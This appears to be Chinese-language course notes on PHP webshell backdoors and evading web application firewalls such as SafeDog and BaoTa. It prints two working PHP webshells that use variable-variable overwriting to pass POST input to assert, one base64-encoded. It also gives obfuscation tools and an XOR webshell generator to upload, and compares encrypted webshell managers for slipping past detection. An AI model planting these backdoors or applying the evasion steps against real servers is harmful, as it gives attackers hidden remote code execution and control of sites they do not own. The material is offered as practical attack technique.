<a name="PSzGX"></a>
## 一、思维导图
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986160-fd4548ac-ec87-4186-bdc0-01e1939f8f87.png#clientId=uc654d338-5b4c-4&from=paste&id=u94ff3caf&originHeight=612&originWidth=741&originalType=url&ratio=1&status=done&style=none&taskId=u5e4a5303-efad-4997-a536-402c6329a5c)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516164926.png)
<a name="XfjC0"></a>
## 二、后门原理
<a name="AsTRT"></a>
### 1、变量覆盖--后门绕过安全狗：
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986048-2fee1469-4dc4-4bf8-ad61-5b17a7d62868.png#clientId=uc654d338-5b4c-4&from=paste&id=ud6b7264e&originHeight=522&originWidth=1180&originalType=url&ratio=1&status=done&style=none&taskId=uff73df57-9e70-47cf-a47f-5dc9754de7c)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516220134.png)<br />相当于<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986148-7148c135-efe5-4ba9-9fe9-27c3d2897fae.png#clientId=uc654d338-5b4c-4&from=paste&id=ud9b75df1&originHeight=278&originWidth=830&originalType=url&ratio=1&status=done&style=none&taskId=ufb847ca4-ee38-49fe-95c7-b7d5fc14f24)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516220202.png)
```bash
<?php
$a = $_GET['x'];
$$a = $_GET['y'];
$b($_POST['z']);

//?x=b&y=assert
//$a $$a=assert=$b
//assert($_POST['chopper'])

?>
```
这里解释$$是什么东西<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483425929-20d1b7b4-0045-4c9c-b4cb-bc10959f0af1.png#clientId=uc654d338-5b4c-4&from=paste&height=390&id=ueeeddac4&originHeight=780&originWidth=982&originalType=binary&ratio=1&size=121262&status=done&style=none&taskId=u6fbf6289-10a9-4e85-8f0c-32159416471&width=491)<br />也就说：使用$var储存了一个String类型的值“PHP”，然后使用引用变量$$var储存一个String类型的值“PHP中文网”。<br />测试：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483956816-74fb17c7-17d7-4320-a300-2d7edb1dfd09.png#clientId=uc654d338-5b4c-4&from=paste&height=347&id=uc847a544&originHeight=694&originWidth=1920&originalType=binary&ratio=1&size=126133&status=done&style=none&taskId=u62c4d347-5b13-439a-b417-8a5a3f0ffb1&width=960)

<a name="pQe2M"></a>
### 2、加密传输
采取上面的方式很可能会被宝塔给拦截<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482986130-f0383773-013a-4cba-a752-814a24f37a56.png#clientId=uc654d338-5b4c-4&from=paste&id=u8121e7c4&originHeight=382&originWidth=562&originalType=url&ratio=1&status=done&style=none&taskId=ud7a45854-cb93-4226-9d12-f638db5e6e7)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516225822.png)<br />编码绕过，在一些常见的waf例如宝塔对传入的参数会进行判断如果是包含类似`phpinfo()`这样的风险代码会被拦截，这个时候我们可以采用对代码进行编码的方式进行参数。
```bash
<?php
$a = $_GET['x'];
$$a = $_GET['y'];
$b(base64_decode($_POST['z']));

//?x=b&y=assert
//$a $$a=assert=$b
//assert($_POST['chopper'])

?>
```
对`PHPinfo();`进行编码为`cGhwaW5mbygpOw==`<br />还可以采取加密传输：<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482997955-e0e51861-d682-4180-928e-5bc97b0c3ca6.png#clientId=uc654d338-5b4c-4&from=paste&id=u4820f5b5&originHeight=165&originWidth=510&originalType=url&ratio=1&status=done&style=none&taskId=u17230998-b616-41ea-bf40-10782eb4233)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516225321.png)<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998120-9c6e041f-6d71-47fc-8f06-85918c46b779.png#clientId=uc654d338-5b4c-4&from=paste&id=u410927e7&originHeight=227&originWidth=583&originalType=url&ratio=1&status=done&style=none&taskId=uaf3fdb27-94a8-4852-a756-227204a685e)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516225502.png)<br />稳得一批：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630485987527-7f65e219-d172-4bb4-a3d1-129f9cac85fd.png#clientId=uc654d338-5b4c-4&from=paste&height=357&id=eWc2K&originHeight=713&originWidth=1919&originalType=binary&ratio=1&size=128747&status=done&style=none&taskId=u1925c60c-85d7-4155-9e39-551496c975a&width=959.5)
<a name="YFNoG"></a>
### 3、加密混淆
下载地址：<br />https://github.com/djunny/enphp <br />目标加密的代码，不要将code_test的文件移到或者删除很有可能会导致使用失败。<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998232-808fbbe2-7fe1-40a9-a19d-9dd80b099d98.png#clientId=uc654d338-5b4c-4&from=paste&id=ua2abf7d5&originHeight=71&originWidth=714&originalType=url&ratio=1&status=done&style=none&taskId=u9aba74e6-8294-4d81-83b8-f1550a486f8)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516230015.png)<br />通过混淆的脚本<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998232-d8caf0c9-9c3d-47ef-8a5f-5cf1b0419279.png#clientId=uc654d338-5b4c-4&from=paste&id=u4213ef95&originHeight=601&originWidth=1060&originalType=url&ratio=1&status=done&style=none&taskId=ud186e80f-5356-4e2c-b66d-62f14680505)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516230145.png)<br />混淆完之后：<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999464-17319a62-3318-4e1d-92cd-3803b80a084b.png#clientId=uc654d338-5b4c-4&from=paste&id=ub6439715&originHeight=173&originWidth=804&originalType=url&ratio=1&status=done&style=none&taskId=ub4ee7053-7194-4f77-9c93-80488d47311)](https://gitee.com/darkerg/article-images/raw/master/typora/20210516231312.png)<br />上传上去之后：<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998886-f8f32730-bd22-4337-8441-57f890200b43.png#clientId=uc654d338-5b4c-4&from=paste&id=ub8ce3119&originHeight=273&originWidth=761&originalType=url&ratio=1&status=done&style=none&taskId=uf587efb0-f0e7-4ef3-9719-d8f4f09cb7a)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517195727.png)<br />很稳。
<a name="ChK7u"></a>
### 4、借用在线API接口实现加密混淆
如果上面的方式被安全狗杀掉，或者过不了宝塔的话。<br />网址：<br />http://phpjiami.com/phpjiami.html <br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482998908-2f8c3246-72c6-4244-b0a4-c1dc9461cd20.png#clientId=uc654d338-5b4c-4&from=paste&id=u50f93b43&originHeight=504&originWidth=1365&originalType=url&ratio=1&status=done&style=none&taskId=u110322cb-8f93-468a-9788-add89f47d26)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517195931.png)
<a name="M0i2h"></a>
### 5、异或加密Webshell-venom
[https://github.com/yzddmr6/as_webshell_venom](https://github.com/yzddmr6/as_webshell_venom)<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999035-43da0dd4-cccd-4f82-9fea-39de854ef01a.png#clientId=uc654d338-5b4c-4&from=paste&id=uc5bbb5a5&originHeight=256&originWidth=740&originalType=url&ratio=1&status=done&style=none&taskId=ud1e1b6b7-9e4a-461f-8207-e98c2dabce4)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517200834.png)<br />运行里面的脚本，然后就出来了，随机的。复制好上传就行。<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999483-8d88bda5-81c7-45fb-9cdc-5ab851a82ef2.png#clientId=uc654d338-5b4c-4&from=paste&id=u77aa3a84&originHeight=251&originWidth=628&originalType=url&ratio=1&status=done&style=none&taskId=u5a1d5058-0b36-47d7-b2dd-d2c089c9aa7)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517200859.png)<br />但是要看一下有没有GET提交id，这个就自己随便构造吧。还支持base64加密提交来绕过。<br />在用蚁剑连接的时候，可以选择扩展选项来进行连接。<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999684-431b86af-ffc2-4ee5-b9d0-d68ad52333a0.png#clientId=uc654d338-5b4c-4&from=paste&id=u790286e5&originHeight=503&originWidth=747&originalType=url&ratio=1&status=done&style=none&taskId=uc68eb09a-7e5a-4efe-b29e-22645c9f0b6)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517201514.png)
<a name="LGEDr"></a>
### 6、webshell管理工具优缺点
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630482999823-0fa8c51d-ed25-4cfd-aaec-c79f891c7824.png#clientId=uc654d338-5b4c-4&from=paste&id=ue75bd264&originHeight=196&originWidth=516&originalType=url&ratio=1&status=done&style=none&taskId=uca65df55-61e2-4757-ac27-94afacbdc19)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517201735.png)<br />单双向加密传输的区别：<br />双向加密传输就是发包之前已经加密了，并且从服务器传回来的数据也是加密的，这样在安全狗这些WAF检测内容的时候就狠nice。
<a name="y0DmL"></a>
#### ①菜刀单向加密举例：
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000078-53c99173-eb61-492c-ad57-2249f5bd6af0.png#clientId=uc654d338-5b4c-4&from=paste&id=u58f737bd&originHeight=397&originWidth=767&originalType=url&ratio=1&status=done&style=none&taskId=u105d8124-f14a-4860-b925-6de92975233)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517202325.png)<br />抓包分析菜刀执行操作时候的数据包，然后模拟提交，返回了目录列表。
<a name="IQS8h"></a>
#### ②冰蝎示例：
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000463-f9eb124f-702b-4a44-9d8e-66661f651717.png#clientId=uc654d338-5b4c-4&from=paste&id=u5fbd969a&originHeight=646&originWidth=991&originalType=url&ratio=1&status=done&style=none&taskId=u2736e867-9fb3-4bb0-ad99-fc15cb64fc4)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517203155.png)<br />双向加密。
<a name="SceEr"></a>
## 三、自己造轮子
<a name="liNdF"></a>
### 1、在冰蝎连接之后，查看目录发现获取不了。
抓包分析了一波，找到了冰蝎获取目录所用到的一些函数。
<a name="l1vVE"></a>
### 2、自己写获取目录
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000326-90dd0405-fbb2-4260-9c28-0b5602eed0f9.png#clientId=uc654d338-5b4c-4&from=paste&id=u34e5ccb8&originHeight=342&originWidth=551&originalType=url&ratio=1&status=done&style=none&taskId=u4469124d-b2a2-47ac-891a-f94451649cc)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517204033.png)<br />获取当前目录。结果：<br />[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000422-309a868f-b2d1-43ce-8165-e59087baa58b.png#clientId=uc654d338-5b4c-4&from=paste&id=u33d77e7a&originHeight=541&originWidth=561&originalType=url&ratio=1&status=done&style=none&taskId=u71f7e302-59a6-4367-a5c4-6cbda609348)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517204049.png)
<a name="pLkou"></a>
### 3、写入文件
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483000541-c98e05cb-757d-4115-b5e5-fd096367bc71.png#clientId=uc654d338-5b4c-4&from=paste&id=uc5ec1ecc&originHeight=340&originWidth=536&originalType=url&ratio=1&status=done&style=none&taskId=u03ee077f-c5dd-4f36-a7fe-0a5b5784bf5)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517204256.png)
<a name="K9bdb"></a>
### 4、自己写脚本模拟工具
[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630483001130-533d417d-538c-4c68-9233-0639d37c7056.png#clientId=uc654d338-5b4c-4&from=paste&id=u779b3ee9&originHeight=490&originWidth=650&originalType=url&ratio=1&status=done&style=none&taskId=ua2e5efd8-4245-4177-b767-10f0a78e04d)](https://gitee.com/darkerg/article-images/raw/master/typora/20210517205018.png)
